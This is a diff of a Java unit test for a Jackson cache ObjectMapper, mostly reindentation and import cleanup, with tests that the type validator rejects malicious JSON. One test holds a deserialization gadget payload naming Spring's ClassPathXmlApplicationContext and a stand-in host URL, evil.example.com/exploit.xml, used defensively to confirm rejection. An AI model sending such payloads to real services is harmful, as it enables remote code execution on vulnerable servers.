@@ -24,11 +24,7 @@ import org.junit.jupiter.api.Test;
 
 import java.math.BigDecimal;
 import java.time.LocalDateTime;
-import java.util.ArrayList;
-import java.util.HashMap;
-import java.util.List;
-import java.util.Map;
-import java.util.UUID;
+import java.util.*;
 
 import static org.assertj.core.api.Assertions.assertThat;
 import static org.assertj.core.api.Assertions.assertThatThrownBy;
@@ -44,9 +40,9 @@ class CacheConfigObjectMapperTest {
     private ObjectMapper createCacheObjectMapper() {
         ObjectMapper mapper = new ObjectMapperConfig().objectMapper();
         mapper.activateDefaultTyping(
-                CachePolymorphicTypeValidatorFactory.createDefault(),
-                ObjectMapper.DefaultTyping.NON_FINAL,
-                JsonTypeInfo.As.PROPERTY
+            CachePolymorphicTypeValidatorFactory.createDefault(),
+            ObjectMapper.DefaultTyping.NON_FINAL,
+            JsonTypeInfo.As.PROPERTY
         );
         mapper.setVisibility(PropertyAccessor.GETTER, JsonAutoDetect.Visibility.NONE);
         mapper.setVisibility(PropertyAccessor.IS_GETTER, JsonAutoDetect.Visibility.NONE);
@@ -125,7 +121,7 @@ class CacheConfigObjectMapperTest {
 
         // when & then
         assertThatThrownBy(() -> mapper.readValue(maliciousJson, Object.class))
-                .isInstanceOf(InvalidTypeIdException.class);
+            .isInstanceOf(InvalidTypeIdException.class);
     }
 
     @Test
@@ -137,7 +133,7 @@ class CacheConfigObjectMapperTest {
 
         // when & then
         assertThatThrownBy(() -> mapper.readValue(maliciousJson, Object.class))
-                .isInstanceOf(InvalidTypeIdException.class);
+            .isInstanceOf(InvalidTypeIdException.class);
     }
 
     @Test
@@ -146,29 +142,29 @@ class CacheConfigObjectMapperTest {
         // given
         ObjectMapper mapper = createCacheObjectMapper();
         Review review = Review.from(
-                ReviewSnapshotState.builder()
-                        .id(1L)
-                        .reviewKey(UUID.fromString("00000000-0000-0000-0000-000000000001"))
-                        .reviewerId(10L)
-                        .orderId(100L)
-                        .productId(1000L)
-                        .pricePolicyId(10000L)
-                        .productImageUrl("https://example.com/a.png")
-                        .selectedOptions("OPT-1")
-                        .quantity(2)
-                        .reviewerName("홍길동")
-                        .maskedReviewerName("홍*동")
-                        .rating(Rating.of(5f))
-                        .content("좋아요")
-                        .isPhoto(true)
-                        .isEdited(false)
-                        .likeCount(3)
-                        .status(EntityStatus.ACTIVE)
-                        .createdAt(LocalDateTime.of(2026, 4, 25, 10, 0))
-                        .modifiedAt(LocalDateTime.of(2026, 4, 25, 11, 0))
-                        .orderNum(7L)
-                        .unitAmount(12000L)
-                        .build()
+            ReviewSnapshotState.builder()
+                .id(1L)
+                .reviewKey(UUID.fromString("00000000-0000-0000-0000-000000000001"))
+                .reviewerId(10L)
+                .orderId(100L)
+                .productId(1000L)
+                .pricePolicyId(10000L)
+                .productImageUrl("https://example.com/a.png")
+                .selectedOptions("OPT-1")
+                .quantity(2)
+                .reviewerName("홍길동")
+                .maskedReviewerName("홍*동")
+                .rating(Rating.of(5f))
+                .content("좋아요")
+                .isPhoto(true)
+                .isEdited(false)
+                .likeCount(3)
+                .status(EntityStatus.ACTIVE)
+                .createdAt(LocalDateTime.of(2026, 4, 25, 10, 0))
+                .modifiedAt(LocalDateTime.of(2026, 4, 25, 11, 0))
+                .orderNum(7L)
+                .unitAmount(12000L)
+                .build()
         );
         Reviews reviews = Reviews.from(List.of(review));
 
@@ -185,7 +181,7 @@ class CacheConfigObjectMapperTest {
         assertThat(restoredReview.getQuantity()).isEqualTo(Quantity.of(2));
         assertThat(restoredReview.getUnitAmount()).isEqualTo(Money.of(12000L));
         assertThat(restoredReview.getReviewKey())
-                .isEqualTo(UUID.fromString("00000000-0000-0000-0000-000000000001"));
+            .isEqualTo(UUID.fromString("00000000-0000-0000-0000-000000000001"));
         assertThat(restoredReview.getStatus()).isEqualTo(EntityStatus.ACTIVE);
     }
 
@@ -211,10 +207,10 @@ class CacheConfigObjectMapperTest {
         // given
         ObjectMapper mapper = createCacheObjectMapper();
         String maliciousJson =
-                "[\"org.springframework.context.support.ClassPathXmlApplicationContext\",\"http://evil.example.com/exploit.xml\"]";
+            "[\"org.springframework.context.support.ClassPathXmlApplicationContext\",\"http://evil.example.com/exploit.xml\"]";
 
         // when & then
         assertThatThrownBy(() -> mapper.readValue(maliciousJson, Object.class))
-                .isInstanceOf(InvalidTypeIdException.class);
+            .isInstanceOf(InvalidTypeIdException.class);
     }
 }
